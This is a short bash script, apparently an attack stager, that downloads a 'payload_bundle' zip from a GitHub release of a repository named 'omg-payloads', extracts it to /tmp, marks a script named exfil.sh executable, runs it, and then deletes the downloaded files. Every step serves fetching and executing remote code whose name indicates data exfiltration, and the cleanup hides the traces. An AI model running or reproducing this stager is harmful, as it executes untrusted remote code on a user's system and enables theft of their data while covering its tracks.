#!/bin/bash

# Step 1: Navigate to a temp directory
cd /tmp || cd ~

# Step 2: Download the payload bundle from GitHub
curl -L -o payload_bundle.zip https://github.com/gcorderman/omg-payloads/releases/download/v1.0.0/payload_bundle.zip

# Step 3: Unzip the bundle
unzip -o payload_bundle.zip -d payload_bundle

# Step 4: Change to the extracted directory
cd payload_bundle || exit

# Step 5: Make script executable (in case it's not)
chmod +x exfil.sh

# Step 6: Execute the payload
./exfil.sh

# Step 7: Optional – clean up
cd /tmp || cd ~
rm -rf payload_bundle payload_bundle.zip
